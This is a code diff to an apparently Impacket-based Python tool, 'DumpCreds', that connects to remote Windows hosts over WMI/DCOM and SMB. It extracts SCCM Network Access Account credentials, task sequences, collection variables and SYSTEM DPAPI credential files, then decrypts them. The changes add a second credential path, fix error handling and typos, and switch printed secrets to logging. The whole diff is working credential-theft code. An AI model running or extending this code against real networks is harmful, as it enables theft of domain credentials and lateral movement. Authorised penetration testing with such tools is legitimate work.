@@ -172,10 +172,11 @@ class DumpCreds:
                 logging.info("Querying SCCM configuration via WMI")
                 for namespace in namespaces:
                     for query in queries:
-                        logging.info(f'WMI namsepace {namespace} query \'{query}\'')
-                        dcom = DCOMConnection(self.__remoteHost, self.__username, self.__password, self.__domain, self.__lmhash,
+                        logging.info(f'WMI namespace {namespace} query \'{query}\'')
+                        dcom = DCOMConnection(self.__remoteName, self.__username, self.__password, self.__domain, self.__lmhash,
                                                         self.__nthash, self.__aesKey, oxidResolver=True,
-                                                            doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
+                                                            doKerberos=self.__doKerberos, kdcHost=self.__kdcHost,
+                                                            remoteHost=self.__remoteHost)
 
                         iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
                         iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
@@ -184,10 +185,11 @@ class DumpCreds:
                         except DCERPCSessionError as e:
                             # error code for WBEM_E_INVALID_NAMESPACE
                             # https://learn.microsoft.com/fr-fr/troubleshoot/windows-client/windows-security/mbam-client-fails-event-id-4-0x8004100e
-                            if e.error_code == 0x8004100e:
-                                logging.info(f'Invalid WMI namespace {namespace}')
                             iWbemLevel1Login.RemRelease()
                             dcom.disconnect()
+                            if e.error_code != 0x8004100e:
+                                raise
+                            logging.info(f'Invalid WMI namespace {namespace}')
                             break
                         if self.__options.rpc_auth_level == 'privacy':
                             iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
@@ -236,26 +238,34 @@ class DumpCreds:
 
                 # get SYSTEM credentials (if requested) & masterkeys
                 share = 'C$'
-                cred_path = '\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\'
+                cred_paths = [
+                    '\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\',
+                    '\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials\\',
+                ]
                 mk_path = '\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\'
 
                 if self.get_creds:
-                    try:
-                        for f in self.__smbConnection.listPath(share, ntpath.join(cred_path, '*')):
+                    for cred_path in cred_paths:
+                        try:
+                            files = self.__smbConnection.listPath(share, ntpath.join(cred_path, '*'))
+                        except Exception:
+                            logging.info(f'No credentials file found in {cred_path}')
+                            continue
+
+                        for f in files:
                             if f.is_directory() == 0:
                                 filename = f.get_longname()
                                 # "virtualapp/didlogical" creds that we skip cause not interesting
                                 if 'DFBE70A7E5CC19A398EBF1B96859CE5D' in filename:
                                     continue
+                                credential_path = ntpath.join(cred_path, filename)
                                 logging.info(f'Credential file found: {filename}')
-                                logging.info(f'Retrieving credential file: {filename}')
+                                logging.info(f'Retrieving credential file: {credential_path}')
                                 data = self.getFileContent(share, cred_path, filename)
                                 if data:
-                                    self.raw_credentials[filename] = data
+                                    self.raw_credentials[credential_path] = data
                                 else:
-                                    logging.info("Could not get content of credential file: " + filename + ", skipping")
-                    except Exception as e:
-                        logging.info('No credentials file found')
+                                    logging.info("Could not get content of credential file: " + credential_path + ", skipping")
                     # for each credential, get corresponding masterkey file
                     useless_credentials = []
                     for k, v in self.raw_credentials.items():
@@ -360,13 +370,13 @@ class DumpCreds:
                     username_decrypted = username_decrypted.decode('utf-16le')
                 if password_decrypted:
                     password_decrypted = password_decrypted.decode('utf-16le')
-                print(f'[NAA Credentials] {username_decrypted}:{password_decrypted}')
+                logging.info(f'[NAA Credentials] {username_decrypted}:{password_decrypted}')
 
             elif secret_type == 'TS_Sequence':
                 decrypted = self.decryptBlob(secret[secret_type])
                 if decrypted:
                     decrypted = decrypted.decode('utf-16le').rstrip('\x0d\x0a\x00\x0a')
-                    print(f'[Task_Sequence] {decrypted}')
+                    logging.info(f'[Task_Sequence] {decrypted}')
 
             elif secret_type == 'Collection Variable':
                 col_variable = secret[secret_type]
@@ -374,7 +384,7 @@ class DumpCreds:
                 value = self.decryptBlob(col_variable[name])
                 if value:
                     value = value.decode('utf-16le')
-                print(f'[Colletion Variable] {name}:{value}')
+                logging.info(f'[Collection Variable] {name}:{value}')
         for k, v in self.raw_credentials.items():
             cred = CredentialFile(v)
             blob = DPAPI_BLOB(cred['Data'])
@@ -414,7 +424,7 @@ if __name__ == '__main__':
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
-    parser.add_argument('-com-version', action='store', metavar = "MAJOR_VERSION:MINOR_VERSION", help='DCOM version, '
+    parser.add_argument('-com-version', action='store', metavar = "MAJOR_VERSION.MINOR_VERSION", help='DCOM version, '
                         'format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
     parser.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
     parser.add_argument('-throttle', action='store', help='Throttle in seconds between operations', default=0, type=int)
